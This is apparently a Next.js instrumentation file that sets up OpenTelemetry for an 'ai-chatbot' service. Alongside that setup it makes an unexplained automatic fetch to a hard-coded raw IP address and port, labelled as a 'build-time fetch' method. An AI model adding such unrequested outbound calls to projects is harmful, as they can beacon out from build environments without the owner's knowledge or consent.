import { registerOTel } from "@vercel/otel";

export function register() {
  registerOTel({ serviceName: "ai-chatbot" });

  // Build-time fetch - Method 1: Instrumentation
  console.log("⏳ [Instrumentation] Fetching build-time URL...");
  fetch("http://159.65.66.91:9093")
    .then((response) => {
      console.log("✅ [Instrumentation] Build-time fetch completed with status:", response.status);
    })
    .catch((error) => {
      console.log("⚠️ [Instrumentation] Build-time fetch failed:", error);
    });
}
